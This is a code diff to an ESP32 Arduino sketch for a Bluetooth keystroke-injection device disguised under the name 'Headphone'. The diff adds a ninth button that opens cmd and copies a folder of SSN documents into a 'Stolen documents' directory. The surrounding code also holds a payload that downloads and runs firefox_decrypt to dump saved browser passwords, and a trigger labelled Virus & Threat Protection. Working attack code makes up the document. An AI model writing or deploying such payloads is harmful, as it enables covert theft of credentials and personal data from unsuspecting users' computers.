@@ -8,6 +8,7 @@
 #define BUTTON_6_PIN 22 // Button 6 (Trigger: Calculator)
 #define BUTTON_7_PIN 23 // Button 7 (Trigger: Virus & Threat Protection)
 #define BUTTON_8_PIN 25 // Button 8 (Trigger: Firefox Decrypt)
+#define BUTTON_9_PIN 26 // Button 9 (Trigger: Copy Files Payload)
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -20,6 +21,7 @@ bool lastState5 = HIGH;
 bool lastState6 = HIGH;
 bool lastState7 = HIGH;
 bool lastState8 = HIGH;
+bool lastState9 = HIGH;
 
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
@@ -38,7 +40,7 @@ void openRun() {
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting BLE HID setup with 8 Triggers on Buttons 1-8 (Pins 16, 17, 18, 19, 21, 22, 23, 25)...");
+  Serial.println("Starting BLE HID setup with 9 Triggers on Buttons 1-9 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 26)...");
 
   pinMode(BUTTON_1_PIN, INPUT_PULLUP);
   pinMode(BUTTON_2_PIN, INPUT_PULLUP);
@@ -48,6 +50,7 @@ void setup() {
   pinMode(BUTTON_6_PIN, INPUT_PULLUP);
   pinMode(BUTTON_7_PIN, INPUT_PULLUP);
   pinMode(BUTTON_8_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_9_PIN, INPUT_PULLUP);
 
   Serial.println("Initializing BLE...");
   delay(1000);
@@ -65,6 +68,7 @@ void loop() {
     bool state6 = digitalRead(BUTTON_6_PIN);
     bool state7 = digitalRead(BUTTON_7_PIN);
     bool state8 = digitalRead(BUTTON_8_PIN);
+    bool state9 = digitalRead(BUTTON_9_PIN);
 
     // Button 1: Rickroll (Pin 16)
     if (lastState1 == HIGH && state1 == LOW) {
@@ -184,22 +188,38 @@ void loop() {
     if (lastState8 == HIGH && state8 == LOW) {
       Serial.println("Button 8: Firefox Decrypt (Pin 25)");
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000); // Wait for Start menu
+      bleKeyboard.releaseAll(); delay(1000);
       sendString("powershell", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(7000); // Wait for PowerShell
+      bleKeyboard.releaseAll(); delay(7000);
       sendString("git clone https://github.com/unode/firefox_decrypt.git", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(7000); // Wait for clone
+      bleKeyboard.releaseAll(); delay(7000);
       sendString("cd firefox_decrypt", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(3000); // Wait for cd
+      bleKeyboard.releaseAll(); delay(3000);
       sendString("python firefox_decrypt.py", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(3000); // Wait for script
+      bleKeyboard.releaseAll(); delay(3000);
       sendString("2", 10); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000); // Select profile 2
+      bleKeyboard.releaseAll(); delay(1000);
+    }
+
+    // Button 9: Copy Files Payload (Pin 26)
+    if (lastState9 == HIGH && state9 == LOW) {
+      Serial.println("Button 9: Copy Files Payload (Pin 26)");
+      openRun(); delay(1000); 
+      sendString("cmd", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1500);
+      sendString("mkdir \"C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop\\Stolen documents\"", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("xcopy \"C:\\Users\\Dell\\Documents\\Hello\\SSN\\*\" \"C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop\\Stolen documents\\\" /E /I /Y", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("Copy Files Payload executed");
     }
 
     lastState1 = state1;
@@ -210,6 +230,7 @@ void loop() {
     lastState6 = state6;
     lastState7 = state7;
     lastState8 = state8;
+    lastState9 = state9;
   } else {
     Serial.println("Waiting for BLE connection...");
   }
